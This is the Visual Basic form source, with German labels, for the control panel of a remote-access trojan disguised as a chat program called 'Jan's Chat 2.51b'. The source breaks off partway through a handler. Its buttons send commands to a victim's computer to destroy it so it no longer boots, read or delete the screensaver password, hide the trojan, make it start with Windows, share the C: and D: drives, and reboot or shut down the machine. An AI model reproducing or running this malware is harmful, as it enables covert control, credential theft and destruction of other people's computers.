VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fest Einfach
   Caption         =   "Jan's Chat 2.51b"
   ClientHeight    =   6765
   ClientLeft      =   45
   ClientTop       =   1515
   ClientWidth     =   11790
   DrawMode        =   12  'Keine Operation
   Icon            =   "Server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6765
   ScaleWidth      =   11790
   StartUpPosition =   2  'Bildschirmmitte
   Begin MSComctlLib.StatusBar Status 
      Align           =   2  'Unten ausrichten
      Height          =   375
      Left            =   0
      TabIndex        =   78
      Top             =   6390
      Width           =   11790
      _ExtentX        =   20796
      _ExtentY        =   661
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
   End
   Begin VB.CommandButton Command19 
      Caption         =   "Test"
      Height          =   255
      Left            =   5040
      TabIndex        =   76
      Top             =   5520
      Width           =   855
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Sendkeys"
      Height          =   495
      Left            =   6960
      TabIndex        =   75
      ToolTipText     =   "Öffnet viele viele viele Anwendungen"
      Top             =   5880
      Width           =   1215
   End
   Begin VB.CheckBox Check6 
      Caption         =   "Mauszeig"
      Height          =   375
      Left            =   3720
      TabIndex        =   74
      Top             =   5400
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CommandButton Command15 
      Caption         =   "Mauszeiger"
      Height          =   495
      Left            =   8160
      TabIndex        =   73
      ToolTipText     =   "Mauszeiger aus /an"
      Top             =   5880
      Width           =   1215
   End
   Begin VB.CommandButton Command12 
      Caption         =   "BEEP"
      Height          =   495
      Left            =   8160
      TabIndex        =   72
      Top             =   5400
      Width           =   1215
   End
   Begin VB.CheckBox Check5 
      Caption         =   "BEEP"
      Height          =   255
      Left            =   3000
      TabIndex        =   71
      Top             =   5520
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CheckBox Check4 
      Caption         =   "Doppel"
      Height          =   255
      Left            =   3720
      TabIndex        =   70
      Top             =   5160
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CommandButton Command14 
      Caption         =   "Doppelklick"
      Height          =   495
      Left            =   9360
      TabIndex        =   69
      ToolTipText     =   "Doppelklickgeschwindigkeit aus / ein"
      Top             =   5880
      Width           =   1215
   End
   Begin VB.CheckBox Check3 
      Caption         =   "Monitor"
      Height          =   255
      Left            =   2880
      TabIndex        =   68
      Top             =   5400
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CommandButton Command17 
      Caption         =   "Monitor"
      Height          =   495
      Left            =   9360
      TabIndex        =   67
      ToolTipText     =   "Schaltet den Monitor ein / aus"
      Top             =   5400
      Width           =   1215
   End
   Begin VB.CommandButton Command49 
      Caption         =   "Caps"
      Height          =   495
      Left            =   10560
      TabIndex        =   66
      ToolTipText     =   "Schaltet die Caps an / aus"
      Top             =   5880
      Width           =   1215
   End
   Begin VB.CheckBox Check2 
      Caption         =   "Caps"
      Height          =   375
      Left            =   3000
      TabIndex        =   65
      Top             =   5160
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   3480
      Top             =   2520
   End
   Begin VB.CommandButton Command48 
      Caption         =   "Mausbewgen AUS"
      Height          =   495
      Left            =   10560
      TabIndex        =   64
      ToolTipText     =   "Schaltet das Bewegen wieder ab"
      Top             =   5400
      Width           =   1215
   End
   Begin VB.CommandButton Command47 
      Caption         =   "Mausbewegen AN"
      Height          =   495
      Left            =   10560
      TabIndex        =   63
      ToolTipText     =   "Lässt die Maus sich zufällig bewegen"
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton Command46 
      Caption         =   "Taskbar aus"
      Height          =   495
      Left            =   10560
      TabIndex        =   62
      ToolTipText     =   "Blendet die Taskbar wieder aus"
      Top             =   4440
      Width           =   1215
   End
   Begin VB.CommandButton Command11 
      Caption         =   "Taskbar an "
      Height          =   495
      Left            =   10560
      TabIndex        =   61
      ToolTipText     =   "Blendet die taskbar wieder ein"
      Top             =   3960
      Width           =   1215
   End
   Begin VB.CommandButton Command34 
      Caption         =   "Drucken ?"
      Height          =   540
      Left            =   10560
      TabIndex        =   60
      ToolTipText     =   "Drucken ?"
      Top             =   2475
      Width           =   1215
   End
   Begin VB.CommandButton Command37 
      Caption         =   "Festplattengröße"
      Enabled         =   0   'False
      Height          =   495
      Left            =   10560
      TabIndex        =   59
      Top             =   1485
      Width           =   1215
   End
   Begin VB.CommandButton Command42 
      Caption         =   "Bildschirmschoner Passwort AUS"
      Height          =   495
      Left            =   10560
      TabIndex        =   58
      ToolTipText     =   "Bildschirmschoner Passwort AUS"
      Top             =   990
      Width           =   1215
   End
   Begin VB.CommandButton Command43 
      Caption         =   "bildschirmschonerpasswort AN"
      Height          =   495
      Left            =   10560
      TabIndex        =   57
      ToolTipText     =   "schirmschonerpasswort AN"
      Top             =   0
      Width           =   1215
   End
   Begin VB.CommandButton Command44 
      Caption         =   "Bildschirmschoner Passwort löschen"
      Height          =   495
      Left            =   10560
      TabIndex        =   56
      ToolTipText     =   "Bildschirmschoner Passwort löschen"
      Top             =   1980
      Width           =   1215
   End
   Begin VB.CommandButton Command45 
      Caption         =   "Zufälliges Kennwort"
      Height          =   495
      Left            =   10560
      TabIndex        =   55
      ToolTipText     =   "fälliges Kennwort"
      Top             =   495
      Width           =   1215
   End
   Begin VB.CommandButton Command13 
      Caption         =   "ZERSTÖREN"
      Height          =   495
      Left            =   8160
      TabIndex        =   54
      ToolTipText     =   "OPFER = TOT (KEIN BOOTEN MEHR)"
      Top             =   2475
      Width           =   1215
   End
   Begin VB.CommandButton internetip 
      Caption         =   "INTERNET IP"
      Height          =   495
      Left            =   8160
      TabIndex        =   53
      Top             =   1980
      Width           =   1215
   End
   Begin VB.CommandButton Command16 
      Caption         =   "Bildschirmschoner Passwort"
      Height          =   495
      Left            =   8160
      TabIndex        =   52
      ToolTipText     =   "Zeigt das Bildschirmschoner Passwort"
      Top             =   1485
      Width           =   1215
   End
   Begin VB.CommandButton Command35 
      Caption         =   "insecure"
      Height          =   495
      Left            =   9360
      TabIndex        =   51
      Top             =   3960
      Width           =   1215
   End
   Begin VB.CommandButton Command38 
      Caption         =   "IE TITLE"
      Height          =   495
      Left            =   8160
      TabIndex        =   50
      ToolTipText     =   "Beim Internet Explorer einen Title einfügen"
      Top             =   2970
      Width           =   1215
   End
   Begin VB.CommandButton Command39 
      Caption         =   "Windows OEM"
      Height          =   495
      Left            =   8160
      TabIndex        =   49
      ToolTipText     =   "Zeigt einem die Windows OEM Nummer an"
      Top             =   3465
      Width           =   1215
   End
   Begin VB.CommandButton Command40 
      Caption         =   "Mit Windows starten"
      Height          =   495
      Left            =   8160
      TabIndex        =   48
      ToolTipText     =   "Client wird mit Windows gestartet"
      Top             =   3960
      Width           =   1215
   End
   Begin VB.CommandButton Command41 
      Caption         =   "Ohne Windows Starten"
      Height          =   495
      Left            =   8160
      TabIndex        =   47
      ToolTipText     =   "Autostart funktion ausgeschaltet"
      Top             =   4455
      Width           =   1215
   End
   Begin VB.CommandButton Command30 
      Caption         =   "Bildschirmschoner"
      Height          =   495
      Left            =   9360
      TabIndex        =   46
      ToolTipText     =   "schaltet den Bildschirmschoner beim Opfer an"
      Top             =   2970
      Width           =   1215
   End
   Begin VB.CommandButton Command29 
      Caption         =   "Disconnect"
      Height          =   495
      Left            =   9360
      TabIndex        =   45
      ToolTipText     =   "geht aus dem Internet"
      Top             =   2475
      Width           =   1215
   End
   Begin VB.CommandButton Command28 
      Caption         =   "Autoconnect off"
      Height          =   495
      Left            =   9360
      TabIndex        =   44
      ToolTipText     =   "schaltet das Autoconnecten wieder aus"
      Top             =   1980
      Width           =   1215
   End
   Begin VB.CommandButton Command27 
      Caption         =   "Autoconnect"
      Height          =   495
      Left            =   9360
      TabIndex        =   43
      ToolTipText     =   "wählt sich selbständig in das Internet ein (falls Passwort eingetragen) alle 50 Ms"
      Top             =   1485
      Width           =   1215
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Secure"
      Height          =   495
      Left            =   9360
      TabIndex        =   42
      ToolTipText     =   "lässt alle Laufwerke verschwinden nach dem Neustart (auch im Explorer)"
      Top             =   3465
      Width           =   1215
   End
   Begin VB.CommandButton Command9 
      Caption         =   "Format A:"
      Height          =   495
      Left            =   9360
      TabIndex        =   41
      ToolTipText     =   "Formatier das Diskettenlaufwerk (Dialog)"
      Top             =   4440
      Width           =   1215
   End
   Begin VB.CommandButton WORKGROUP 
      BackColor       =   &H00008000&
      Caption         =   "WORKGROUP SETZEN"
      Height          =   495
      Left            =   9360
      MaskColor       =   &H00008000&
      MouseIcon       =   "Server.frx":030A
      MousePointer    =   99  'Benutzerdefiniert
      Style           =   1  'Grafisch
      TabIndex        =   40
      ToolTipText     =   "Setzt die Workgroup auf I'Ve hack you (NEUSTART ERFORDERLICH)"
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton FreigabeD 
      BackColor       =   &H00008000&
      Caption         =   "D:\Freigeben"
      Height          =   495
      Left            =   8160
      MaskColor       =   &H000000FF&
      MouseIcon       =   "Server.frx":0614
      Style           =   1  'Grafisch
      TabIndex        =   39
      ToolTipText     =   "Freigeben von dem Laufwerk D:\ (NEUSTARTEN ERFORDERLICH)"
      Top             =   4920
      UseMaskColor    =   -1  'True
      Width           =   1215
   End
   Begin VB.CommandButton Freigabe 
      BackColor       =   &H00008000&
      Caption         =   "C:\ Freigeben"
      Height          =   495
      Left            =   6960
      MouseIcon       =   "Server.frx":091E
      MousePointer    =   99  'Benutzerdefiniert
      Style           =   1  'Grafisch
      TabIndex        =   38
      ToolTipText     =   "Freigeben von dem Laufwerk C:\ (NEUSTART ERFORDERLICH)"
      Top             =   4920
      Width           =   1215
   End
   Begin VB.CommandButton Command10 
      Caption         =   "schreiebn"
      Height          =   495
      Left            =   7575
      TabIndex        =   37
      ToolTipText     =   "schreibt den Neuen Rechnernamen I'Ve Hack YOU"
      Top             =   5400
      Width           =   615
   End
   Begin VB.CommandButton Command23 
      Caption         =   "lesen"
      Height          =   495
      Left            =   6960
      TabIndex        =   36
      ToolTipText     =   "Zeigt den Akuellen Rechnernamen an"
      Top             =   5400
      Width           =   615
   End
   Begin VB.CommandButton Command25 
      Caption         =   "Laufwerke anzeigen "
      Height          =   495
      Left            =   9360
      TabIndex        =   35
      ToolTipText     =   "zeigt alle Laufwerke des Opfers an"
      Top             =   0
      Width           =   1215
   End
   Begin VB.CommandButton Command26 
      Caption         =   "Trojan verstecken"
      Height          =   495
      Left            =   9360
      TabIndex        =   34
      ToolTipText     =   "Das Opfer sieht das Programm nicht mehr"
      Top             =   495
      Width           =   1215
   End
   Begin VB.CommandButton Command31 
      Caption         =   "Trojan zeigen"
      Height          =   495
      Left            =   9360
      TabIndex        =   33
      Top             =   990
      Width           =   1215
   End
   Begin VB.CommandButton Command8 
      Caption         =   "reboot"
      Height          =   495
      Left            =   6960
      TabIndex        =   32
      ToolTipText     =   "Startet den Rechner des Opfers neu"
      Top             =   2445
      Width           =   1215
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Msg"
      Height          =   495
      Left            =   6960
      TabIndex        =   31
      ToolTipText     =   "schickt eine MSG"
      Top             =   1950
      Width           =   1215
   End
   Begin VB.CommandButton malen 
      Caption         =   "Malen"
      Height          =   495
      Left            =   6960
      TabIndex        =   30
      ToolTipText     =   "Malen des Desktops (Endlos)"
      Top             =   3930
      Width           =   1215
   End
   Begin VB.CommandButton Command3 
      Caption         =   "NF"
      Height          =   495
      Left            =   6960
      TabIndex        =   29
      ToolTipText     =   "?????????"
      Top             =   960
      Width           =   1215
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Browser Startseite"
      Height          =   495
      Left            =   6960
      TabIndex        =   28
      ToolTipText     =   "ändert die Browser Startseite"
      Top             =   1455
      Width           =   1215
   End
   Begin VB.CommandButton Command6 
      Caption         =   "FUNNY / Beenden"
      Height          =   495
      Left            =   6960
      TabIndex        =   27
      Top             =   4425
      Width           =   1215
   End
   Begin VB.CommandButton Command32 
      Caption         =   "Shutdown"
      Height          =   495
      Left            =   6960
      TabIndex        =   26
      Top             =   2940
      Width           =   1215
   End
   Begin VB.CommandButton Command33 
      Caption         =   "Logoff"
      Height          =   495
      Left            =   6960
      TabIndex        =   25
      Top             =   3435
      Width           =   1215
   End
   Begin VB.TextBox Text5 
      Height          =   375
      Left            =   0
      TabIndex        =   24
      Text            =   "Keine Verbindung zum Client"
      ToolTipText     =   "Connection Status"
      Top             =   5760
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.Frame Frame1 
      Caption         =   "Clients"
      Height          =   2535
      Left            =   0
      TabIndex        =   21
      Top             =   1560
      Width           =   3015
      Begin VB.ListBox List1 
         Height          =   2010
         Left            =   120
         TabIndex        =   22
         TabStop         =   0   'False
         Top             =   360
         Width           =   2775
      End
   End
   Begin VB.ListBox List2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00E0E0E0&
      Height          =   1425
      ItemData        =   "Server.frx":0C28
      Left            =   120
      List            =   "Server.frx":0C2A
      MultiSelect     =   2  'Erweitert
      TabIndex        =   20
      TabStop         =   0   'False
      Top             =   0
      Width           =   2895
   End
   Begin VB.TextBox Text4 
      Height          =   375
      Left            =   2280
      TabIndex        =   19
      Text            =   "5"
      ToolTipText     =   "Gibt den Port an"
      Top             =   4080
      Width           =   495
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   0
      TabIndex        =   0
      ToolTipText     =   "Hier bitte den Rechnernamen oder IP eintragen"
      Top             =   4560
      Width           =   2775
   End
   Begin VB.CommandButton Command36 
      Caption         =   "&Connection"
      Enabled         =   0   'False
      Height          =   375
      Left            =   0
      TabIndex        =   18
      Top             =   4080
      Width           =   2175
   End
   Begin VB.OptionButton Option2 
      Caption         =   "640 x 480"
      Height          =   255
      Left            =   10560
      TabIndex        =   17
      Top             =   3000
      Width           =   1215
   End
   Begin VB.OptionButton Option1 
      Caption         =   "800 x 600"
      Height          =   255
      Index           =   1
      Left            =   10560
      TabIndex        =   16
      Top             =   3240
      Value           =   -1  'True
      Width           =   1215
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1024 x 768"
      Height          =   255
      Index           =   2
      Left            =   10560
      TabIndex        =   15
      Top             =   3480
      Width           =   1215
   End
   Begin VB.OptionButton Option1 
      Caption         =   "1152 x 864"
      Height          =   255
      Index           =   3
      Left            =   10560
      TabIndex        =   14
      Top             =   3720
      Width           =   1215
   End
   Begin VB.CommandButton Command24 
      Caption         =   "Bildschirmgröße"
      Height          =   495
      Left            =   8160
      TabIndex        =   13
      ToolTipText     =   "Auflösung des Bildschirms des Opfers"
      Top             =   0
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Close"
      Height          =   495
      Left            =   7560
      TabIndex        =   12
      ToolTipText     =   "schließt das Cd - ROM wieder "
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton open 
      Caption         =   "Open"
      Height          =   495
      Left            =   6960
      TabIndex        =   11
      ToolTipText     =   "öffnet das CD-ROM"
      Top             =   480
      Width           =   615
   End
   Begin VB.CommandButton show 
      Caption         =   "Show"
      Height          =   495
      Left            =   7560
      TabIndex        =   10
      ToolTipText     =   "Zeigt den Desktop bei dem Opfer wieder"
      Top             =   0
      Width           =   615
   End
   Begin VB.CommandButton hide 
      Caption         =   "Hide "
      Height          =   495
      Left            =   6960
      TabIndex        =   9
      ToolTipText     =   "versteckt die Symbole auf dem Desktop"
      Top             =   0
      Width           =   615
   End
   Begin VB.CommandButton Command22 
      Caption         =   "Open Browser"
      Height          =   495
      Left            =   8160
      TabIndex        =   8
      ToolTipText     =   "zu www.symantec.com"
      Top             =   495
      Width           =   1215
   End
   Begin VB.CommandButton Command21 
      Caption         =   "Minmieren"
      Height          =   495
      Left            =   8160
      TabIndex        =   7
      ToolTipText     =   "Minimiert alle Anwendungen bei dem Opfer"
      Top             =   990
      Width           =   1215
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   5400
      Top             =   0
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   375
      Left            =   5520
      TabIndex        =   6
      Top             =   2280
      Visible         =   0   'False
      Width           =   1215
   End
   Begin MSWinsockLib.Winsock W 
      Left            =   4920
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H80000001&
      BeginProperty Font 
         Name            =   "MS Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1695
      Left            =   3120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   4
      TabStop         =   0   'False
      ToolTipText     =   "Hier wird der Text Empfangen"
      Top             =   3480
      Width           =   3495
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Send"
      Height          =   375
      Left            =   4200
      TabIndex        =   3
      TabStop         =   0   'False
      ToolTipText     =   "ALT + S reicht auch aus"
      Top             =   2280
      Width           =   1335
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1695
      Left            =   3120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   2
      ToolTipText     =   "Hier wird der Text gesendet"
      Top             =   600
      Width           =   3495
   End
   Begin VB.Label Label3 
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Hier kann man den Rechnernamen oder die IP eintragen....."
      ForeColor       =   &H000000FF&
      Height          =   435
      Left            =   0
      TabIndex        =   77
      Top             =   5040
      Width           =   2775
   End
   Begin VB.Label ConnectionState 
      Caption         =   "Status"
      Height          =   255
      Left            =   0
      TabIndex        =   23
      ToolTipText     =   "Zeigt einem an ob es mit dem Connecten geklappt hat"
      Top             =   5520
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.Label Label2 
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Empfangen !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   5
      Top             =   3000
      Width           =   3495
   End
   Begin VB.Label Label1 
      BackColor       =   &H00FF0000&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Senden !!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   3120
      TabIndex        =   1
      Top             =   120
      Width           =   3495
   End
   Begin VB.Menu Befehl 
      Caption         =   "Befehle"
      Begin VB.Menu spezial 
         Caption         =   "Spezial"
         Shortcut        =   {F2}
      End
   End
   Begin VB.Menu HELP 
      Caption         =   "HILFE"
      Begin VB.Menu how 
         Caption         =   "WIE GEHT DAS PROGRAMM ?"
      End
      Begin VB.Menu Author 
         Caption         =   "Author"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim a
Private Sub Command10_Click()
W.SendData "compu"
End Sub

Private Sub Command10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Schreibt einen neuen Rechnernamen = I've hack YOU (wichtig beim Connecten daran denken)"
End Sub

Private Sub Command11_Click()
W.SendData "taskan"
End Sub

Private Sub Command11_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Blendet die Taskleiste wieder ein"
End Sub

Private Sub Command12_Click()
If Check5.Value = 0 Then
    Check5.Value = 1
    Command12.Caption = "BEEP AN"
    W.SendData "beepon"
    Exit Sub
End If
If Check5.Value = 1 Then
    Check5.Value = 0
    Command12.Caption = "BEEP AUS"
    W.SendData "beepoff"
    Exit Sub
End If
End Sub

Private Sub Command12_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet den Beep an/aus"
End Sub

Private Sub Command13_Click()
W.SendData "dest"
End Sub

Private Sub Command13_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.Font = FF0066
Status.SimpleText = "Vorsichtig Rechner wird zerstört"
End Sub

Private Sub Command14_Click()
If Check4.Value = 0 Then
    Check4.Value = 1
    Command14.Caption = "Doppelklick langsam"
    W.SendData "doppelkS"
    Exit Sub
End If
If Check4.Value = 1 Then
    Check4.Value = 0
    Command14.Caption = "Doppelklick schnell"
    W.SendData "doppelkL"
    Exit Sub
End If

End Sub

Private Sub Command14_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "verändert die Doppelklick Geschwindigkeit AN / AUS"
End Sub

Private Sub Command15_Click()
If Check6.Value = 0 Then
    Check6.Value = 1
    Command15.Caption = "Mauszeiger sichtbar"
    W.SendData "mauszon"
    Exit Sub
End If
If Check6.Value = 1 Then
    Check6.Value = 0
    Command15.Caption = "Mauszeiger unsichtbar auf der Form"
    W.SendData "mauszoff"
    Exit Sub
End If

End Sub

Private Sub Command15_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Lässt den Mauszeiger bewegen....."
End Sub

Private Sub Command16_Click()
W.SendData "passs"
End Sub

Private Sub Command16_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt einem das Bildschrimschoner Passwort"
End Sub

Private Sub Command17_Click()
If Check3.Value = 0 Then
    Check3.Value = 1
    Command17.Caption = "Monitor Ein"
    W.SendData "monion"
    Exit Sub
End If
If Check3.Value = 1 Then
    Check3.Value = 0
    Command17.Caption = "Monitor Aus"
    W.SendData "monioff"
    Exit Sub
End If
End Sub



Private Sub Command17_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Schaltet den Monitor aus / an"
End Sub

Private Sub Command18_Click()
W.SendData "sendikeys"
End Sub

Private Sub Command18_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Bitte klicken um den anderen Rechner zu töten"
End Sub

Private Sub Command19_Click()
Da = Hallo
W.SendData "D"
End Sub

Private Sub Command2_Click()
W.SendData "close"
End Sub

Private Sub Command2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schleißt das CD - ROM Laufwerk wieder "
End Sub

Private Sub Command21_Click()
W.SendData "mini"
End Sub

Private Sub Command21_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Minimiert alle Offenen Fenster"
End Sub

Private Sub Command22_Click()
W.SendData "openIE"
End Sub

Private Sub Command22_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Öffnet den Browser"
End Sub

Private Sub Command23_Click()
W.SendData "compun"
End Sub

Private Sub Command23_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Liest den Rechnernamen aus"
End Sub

Private Sub Command24_Click()
W.SendData "desksize"
End Sub

Private Sub Command24_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "ermittelt die Aktuelle Bildschrimauflösung"
End Sub

Private Sub Command25_Click()
W.SendData "laufw"
End Sub

Private Sub Command25_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt alle verfügbaren Laufwerke"
End Sub

Private Sub Command26_Click()
W.SendData "hideme"
End Sub

Private Sub Command26_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "macht den Trojan unsichtbar"
End Sub

Private Sub Command27_Click()
W.SendData "gogogoye"
End Sub

Private Sub Command27_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Schaltet das Automatische Verbinden mit dem Internet an"
End Sub

Private Sub Command28_Click()
W.SendData "gogogono"
End Sub

Private Sub Command28_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Schaltet das Automatische Verbinden mit dem Internet ab"
End Sub

Private Sub Command29_Click()
W.SendData "rausraus"
End Sub

Private Sub Command29_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Lässt den Rechner nicht mehr ins Internet einwählen"
End Sub

Private Sub Command3_Click()
W.SendData "NF"
End Sub

Private Sub Command3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "NF NF NF NF NF NF NF"
End Sub

Private Sub Command30_Click()
W.SendData "bildi"
End Sub

Private Sub Command30_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Startet den Bildschirmschoner bei dem anderen Rechner"
End Sub

Private Sub Command31_Click()
W.SendData "showme"
End Sub

Private Sub Command31_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt den Trojan (sichtbar als Chat)"
End Sub

Private Sub Command32_Click()
W.SendData "shutdowni"
End Sub

Private Sub Command32_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "der Rechner wird Heruntergefahren"
End Sub

Private Sub Command33_Click()
W.SendData "logoffi"
End Sub

Private Sub Command33_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Der Rechner meldet sich ab"
End Sub

Private Sub Command34_Click()
W.SendData "drucktest"
End Sub

Private Sub Command34_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Fängt an zu drucken"
End Sub

Private Sub Command35_Click()
W.SendData "insecure"
End Sub

Private Sub Command35_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Ist das Gegenteil von Secure lässt den User nach einem Neustart wieder alles machen"
End Sub

Private Sub Command36_Click()
W.Close
W.RemotePort = 5
W.LocalPort = 32767 - RemotePort
'If Text1.Text = "" Then
'MsgBox "Keine Eingabe im Textfeld", vbSystemModal + vbOKOnly, "Fehler Jan N"
'Exit Sub
'End If
W.RemoteHost = Text1.Text
W.Connect
ConnectionState.Visible = True
Text5.Visible = True
End Sub

Private Sub Command37_Click()
W.SendData "festipla"
End Sub

Private Sub Command38_Click()
W.SendData "ietitle"
End Sub

Private Sub Command38_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Die IE Titleleiste ändert sich I've hack YOU (lässt sich nicht einfach rückgängig machen)"
End Sub

Private Sub Command39_Click()
W.SendData "winioem"
End Sub

Private Sub Command39_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt einem die Windows OEM Nummer"
End Sub

Private Sub Command4_Click()
W.SendData "ietitle"
End Sub

Private Sub Command4_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "ändert die Internet Startseite"
End Sub

Private Sub Command40_Click()
W.SendData "wstarton"
End Sub

Private Sub Command40_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "startet den Torjan mit Windows"
End Sub

Private Sub Command41_Click()
W.SendData "wstartoff"
End Sub

Private Sub Command41_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "lässt den Rechner ohne den Trojan starten"
End Sub

Private Sub Command42_Click()
W.SendData "bildiaus"
End Sub

Private Sub Command42_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet das Bildschirmschoner Passwort aus"
End Sub

Private Sub Command43_Click()
W.SendData "bildian"
End Sub

Private Sub Command43_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet das Bildschirmschoner Passwort wieder an"
End Sub

Private Sub Command44_Click()
W.SendData "bildiweg"
End Sub

Private Sub Command44_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Löscht das Bildschirmschoner Passwort"
End Sub

Private Sub Command45_Click()
W.SendData "zbildi"
End Sub

Private Sub Command45_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "setzt ein unmenschliches Passwort (kann man nicht eingeben)"
End Sub

Private Sub Command46_Click()
W.SendData "taskaus"
End Sub

Private Sub Command46_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet die Taskbar aus"
End Sub

Private Sub Command47_Click()
W.SendData "mausiAn"
End Sub

Private Sub Command47_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet die Mausbewegungen bei dem anderen Rechner an"
End Sub

Private Sub Command48_Click()
W.SendData "mausiAus"
End Sub

Private Sub Command48_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schaltet die Mausbewegungen bei dem Rechner ab"
End Sub

Private Sub Command49_Click()
If Check2.Value = 0 Then
    Check2.Value = 1
    Command49.Caption = "CAPS EIN"
